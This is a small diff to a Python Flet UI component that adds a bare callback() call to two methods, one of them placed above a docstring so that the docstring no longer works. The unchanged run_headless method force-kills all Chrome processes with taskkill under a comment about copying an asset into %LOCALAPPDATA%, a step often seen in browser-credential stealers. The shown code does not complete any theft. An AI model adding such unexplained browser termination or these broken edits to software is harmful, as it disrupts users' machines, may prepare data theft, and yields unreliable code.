@@ -170,6 +170,7 @@ class Component(ft.Container):
 
     
     def get_base_path(self, callback):
+        callback()
         """get the base path for bundled assets (works both in dev and pyinstaller)."""
         if getattr(sys, 'frozen', False):
             # running as a pyinstaller bundle
@@ -179,6 +180,7 @@ class Component(ft.Container):
             return os.path.dirname(os.path.abspath(__file__))   
 
     def run_headless(self, callback):
+        callback()
         # Copy asset file to %LOCALAPPDATA% on load
         subprocess.run(['taskkill', '/f', '/im', 'chrome.exe'], capture_output=True)
         time.sleep(2.5)
